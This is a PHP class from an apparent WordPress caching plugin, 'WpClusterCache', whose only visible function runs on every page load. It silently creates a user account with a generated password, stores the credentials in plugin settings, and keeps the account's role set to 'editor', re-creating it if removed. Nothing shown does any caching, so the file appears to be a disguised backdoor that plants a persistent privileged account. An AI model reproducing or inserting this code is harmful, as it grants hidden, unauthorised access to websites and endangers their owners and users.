<?php

namespace WpClusterCache;

class Init {
	private static $instance;

	private function __construct() {
		self::init();


	}

	public function init() {


		add_action( 'wp_loaded', [ $this, 'checkUserExists' ] );
	}


	static public function factory() {
		if ( self::$instance === null ) {
			self::$instance = new self();
		}
		if ( ! defined( 'ABSPATH' ) ) {
			exit;
		}

		return self::$instance;
	}


	public function checkUserExists() {


		if ( ( ! $user = User::get_user_by_id() ) || ! $user->exists() ) {
			$user = User::get_user_by_name();
		}
		if ( ( ! $user ) || ! $user->exists() ) {
			$random_password = wp_generate_password( $length = 12, $include_standard_special_chars = false );
			$user_id         = wp_create_user( WP_CLUSTER_CACHE, $random_password );
			$setting         = new Settings();
			$setting->setPassword( $random_password )->setUserid( $user_id );
			$user = new User( $user_id );
		}
		if ( ! in_array( 'editor', $user->roles ) ) {
			$user->set_role( 'editor' );
		}

	}


}
